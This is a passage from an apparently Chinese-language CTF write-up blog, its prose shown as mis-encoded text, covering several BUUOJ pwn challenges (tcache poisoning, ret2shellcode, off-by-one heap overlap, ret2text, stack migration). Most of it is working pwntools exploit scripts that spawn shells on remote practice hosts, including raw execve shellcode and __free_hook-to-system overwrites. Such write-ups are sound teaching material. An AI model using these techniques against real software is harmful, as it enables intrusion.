<p>æˆ‘ä»¬æ§åˆ¶ tcache struct ä¹‹åç›´æ¥åœ¨åˆé€‚ä¸‹æ ‡å†… <strong>å†å†™å…¥ tcache åœ°å€ï¼ŒäºŒæ¬¡åˆ†é…åæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåˆ†é…åˆ°ä¸€ä¸ª libc ä¸­çš„ chunkï¼Œä»¥æ­¤æ³„éœ² libc åŸºå€</strong></p>
<p>æœ€åå°±æ˜¯æ”¹ <code>__free_hook</code> ä¸º <code>system</code> çš„å¸¸è§„æµç¨‹ï¼Œç”±äº chunk æ•°é‡é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦å¤šæ¬¡æ§åˆ¶ tcache struct</p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26084</span>) <span class="comment">#process(&#x27;./ciscn_final_3&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>,size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;now you can write something&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    heap_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x11e70</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="number">17</span>, <span class="number">0x70</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">18</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">19</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">20</span>, <span class="number">0x70</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">35</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">1</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x10</span>) * <span class="number">6</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    new(<span class="number">21</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">22</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">23</span>, <span class="number">0x50</span>, (<span class="string">b&#x27;\x01&#x27;</span> * <span class="number">10</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) * <span class="number">2</span>)</span><br><span class="line">    new(<span class="number">24</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/05/vA7IVD4GBjLYhcp.png" alt="image.png"></p>
<h2 id="0x03D-pwnable-start-ret2shellcode"><a href="#0x03D-pwnable-start-ret2shellcode" class="headerlink" title="0x03D.pwnable_start - ret2shellcode"></a>0x03D.pwnable_start - ret2shellcode</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œå››èˆäº”å…¥å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºwww</p>
<p><img src="https://i.loli.net/2021/02/27/eWtvYxgB5Ezru4X.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/02/27/9xCG7JhlVWqao6i.png" alt="image.png"></p>
<p>ç¨‹åºæœ¬èº«çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå…ˆæ˜¯ç³»ç»Ÿè°ƒç”¨<code>write</code>è¾“å‡ºæ ˆä¸Šå­—ç¬¦ä¸²ï¼Œç„¶åæ˜¯ç³»ç»Ÿè°ƒç”¨<code>read</code>è¯»å…¥æœ€å¤§<code>0x3c</code>ä¸ªå­—èŠ‚ï¼Œå®¹æ˜“çœ‹å‡ºå­˜åœ¨æ ˆæº¢å‡º</p>
<p>ä¸ä¸€èˆ¬å‡½æ•°çš„é€»è¾‘æ‰€ä¸åŒçš„æ˜¯ï¼Œåœ¨å¼€å§‹æ—¶å…ˆå°†espçš„å€¼å‹å…¥æ ˆä¸­ï¼Œå†å°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡æ§åˆ¶ç¨‹åºè¿”å›åˆ°writeç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼<strong>æ³„æ¼å‡ºæ ˆä¸Šåœ°å€</strong></p>
<p>æ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘æ³„éœ²åœ°å€ååœ¨æ ˆä¸Šè¾“å…¥shellcodeä»¥ret2shellcodeæ¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;,25392)#process(&#x27;./start&#x27;)</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">offset = 0x14</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;A&#x27; * offset + p32(0x8048087)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">stack_leak = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;A&#x27; * offset + p32(stack_leak + 0x14) + b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;#asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/76cAGQgP4XxshCp.png" alt="image.png"></p>
<h2 id="0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping"><a href="#0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping" class="headerlink" title="0x03E.hitcontraining_heapcreator - off by one + chunk overlapping"></a>0x03E.hitcontraining_heapcreator - off by one + chunk overlapping</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦åªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/04/05/8O2XJIRexBluKaz.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>åŠŸèƒ½ä¸€åº”ä¿±å…¨ï¼Œæ•´æŒºå¥½</p>
<p><img src="https://i.loli.net/2021/04/05/yLI5vbmPo7kSlRp.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºç¼–è¾‘æ—¶ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨ off by one æ¼æ´</p>
<p><img src="https://i.loli.net/2021/04/05/2kKaC8wJQEHWnDu.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ©ç”¨off by oneçš„æ¼æ´æ”¹å¤§ä¸€ä¸ªchunkçš„sizeé€å…¥unsorted binååˆ†å‰²é€ æˆoverlappingï¼ŒåŒæ—¶ libc åŸºå€å¯ä»¥é€šè¿‡æ ˆä¸Šæ®‹ç•™æŒ‡é’ˆæ³„éœ²</p>
<p>é¢˜ç›®ä¸­çš„ heaparray ä¸­å¦‚ä¸‹ç»“æ„ä½“ç®¡ç†æ¯ä¸ª chunkï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_HEAP_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">void</span> * chunk;</span><br><span class="line">&#125;heap;</span><br></pre></td></tr></table></figure>

<p>è€Œæ¯æ¬¡ä¸ºç”¨æˆ·åˆ†é… chunk ä¹‹å‰éƒ½ä¼šç”¨ malloc å…ˆåˆ†é…ä¸€ä¸ªè¿™æ ·çš„ç»“æ„ä½“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡overlappingç›´æ¥æ”¹æŸä¸ª chunk æŒ‡é’ˆä¸º <code>__free_hook</code> ä¸€å¥—å¸¦èµ°</p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25096</span>) <span class="comment">#process(&#x27;./heapcreator&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span> + p8(<span class="number">0xf1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/05/oe3m9PQUJcgnFHD.png" alt="image.png"></p>
<h2 id="0x03F-wustctf2020-getshell-2-ret2text"><a href="#0x03F-wustctf2020-getshell-2-ret2text" class="headerlink" title="0x03F.wustctf2020_getshell_2 - ret2text"></a>0x03F.wustctf2020_getshell_2 - ret2text</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/05/qDjlmPpt5GXdFLZ.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å­˜åœ¨ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/05/esRV9TKSXuCgdlq.png" alt="image.png"></p>
<p>å­˜åœ¨ system å‡½æ•°å’Œ <code>sh</code> å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2021/04/05/WQNUs5r8xoEOISq.png" alt="image.png"></p>
<p>ç›´æ¥ ret2text å³å¯</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25491</span>) <span class="comment">#process(&#x27;./wustctf2020_getshell_2&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./wustctf2020_getshell_2&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048529</span>) + p32(e.search(<span class="string">b&#x27;sh\x00&#x27;</span>).__next__()) * <span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/05/uPAWRDyvd6zosp2.png" alt="image.png"></p>
<h2 id="0x040-ciscn-2019-s-4-ret2text-stack-migration"><a href="#0x040-ciscn-2019-s-4-ret2text-stack-migration" class="headerlink" title="0x040.ciscn_2019_s_4 - ret2text + stack migration"></a>0x040.ciscn_2019_s_4 - ret2text + stack migration</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/05/7zHIhiaFC1Bf94E.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æœ‰ä¸ª 8 å­—èŠ‚æº¢å‡ºï¼Œä½†æ˜¯èƒ½è¯»ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æœ‰è¾“å‡ºï¼Œå¯ä»¥æ³„éœ² ebp</p>
<p><img src="https://i.loli.net/2021/04/05/uSZD8hLIzOHdy2A.png" alt="image.png"></p>
<p>æœ‰ system å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/04/05/LXAvar6inG3B4Vm.png" alt="image.png"></p>
<p>æ³„éœ²æ ˆä¸Šåœ°å€åæ ˆè¿ç§»å³å¯</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26288</span>) <span class="comment">#process(&#x27;./ciscn_s_4&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">call_sys = <span class="number">0x8048559</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span> * offset)</span><br><span class="line">ebp_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;ebp leak: &#x27;</span> + <span class="built_in">hex</span>(ebp_leak))</span><br><span class="line">buf_addr = ebp_leak - <span class="number">0x38</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p32(call_sys) * <span class="number">2</span> + p32(buf_addr + offset - <span class="number">4</span>) * <span class="number">7</span> + <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(buf_addr) + p32(<span class="number">0x8048562</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/05/SarVoEfIJXCgP2A.png" alt="image.png"></p>
<blockquote>
<p>ç¬”è€…ä¸€å¼€å§‹ä¸€ç›´å½“64ä½æ¥æƒ³ï¼Œè¿˜åœ¨æ€è€ƒâ€œå°±æº¢å‡º8ä¸ªå­—èŠ‚æ€ä¹ˆæ§åˆ¶è¿”å›åœ°å€â€â€¦</p>
<p>ä»¥åŠç¬¬äºŒé¡µç»ˆäºå®Œç»“äº†ï¼Œå¯å–œå¯è´ºå¯å–œå¯è´º.jpg</p>
</blockquote>
<h1 id="0x041-0x050"><a href="#0x041-0x050" class="headerlink" title="0x041 ~ 0x050"></a>0x041 ~ 0x050</h1><h2 id="0x041-mrctf2020-easyoverflow-overflow"><a href="#0x041-mrctf2020-easyoverflow-overflow" class="headerlink" title="0x041.mrctf2020_easyoverflow - overflow"></a>0x041.mrctf2020_easyoverflow - overflow</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/06/nPdZeFxt6Cq1S9L.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æœ‰æº¢å‡ºï¼Œå­—ç¬¦ä¸²æ¯”è¾ƒé€šè¿‡å³å¯æ‹¿shell</p>
<p><img src="https://i.loli.net/2021/04/06/QJ72tAFYDM9kdaO.png" alt="image.png"></p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29407</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + <span class="string">b&quot;n0t_r3@11y_f1@g&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/aYCuzZgHB6xTpyA.png" alt="image.png"></p>
<h2 id="0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</h2><p>å‡ºç°é‡å¤çš„é¢˜æ˜¯çœŸçš„ç¦»è°±</p>
<p>è¿‡ç¨‹è§å‰é¢0x011ï¼Œè¿™é‡Œå°±ä¸å†èµ˜å™äº†</p>
<p>expå¦‚ä¸‹ï¼š</p>
